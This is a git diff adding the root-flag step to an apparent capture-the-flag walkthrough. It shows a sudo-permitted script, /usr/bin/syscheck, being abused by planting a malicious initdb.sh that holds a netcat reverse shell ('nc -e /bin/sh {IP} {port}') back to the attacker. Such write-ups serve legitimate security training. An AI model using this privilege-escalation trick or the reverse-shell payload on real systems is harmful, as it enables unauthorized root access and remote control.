@@ -177,4 +177,21 @@ This means that you accessed the webserver shell. Playing around (moving through
 
 #### Root flag
 
-Now is the time to get the `root flag`.
+Now is the time to get the `root flag`. Let's see what are the privileges the user logged as default has. Run `sudo -l`. You will get the following outcome:
+
+(pic20)
+
+There is a line that states "User dvir may run the following commands on headless". Let's cat that content:
+
+(pic21)
+
+`/usr/bin/syscheck` is a system checking script that performs several actions, among them checking if a process named `ìnitdb.sh` is running; if not, it attempts to start it.
+
+Since `syscheck` runs `initdb.sh` script, an attacker can exploit this by placing a malicious `initdb.sh` script in the directory from which the `syscheck`is executed. The plan is to insert a reverse shell ayload into the `initdb.sh` script. For that run:
+
+```
+echo "nc -e /bin/sh {IP} {port}" > initdb.sh
+chmod +x initdb.sh
+```
+
+Being {IP} and {port} your IP and port (my port in this case will be 1212). Echo prints the payload that will be executed by the webserver to return a reverse shell to us. Second line is to make the file executable.
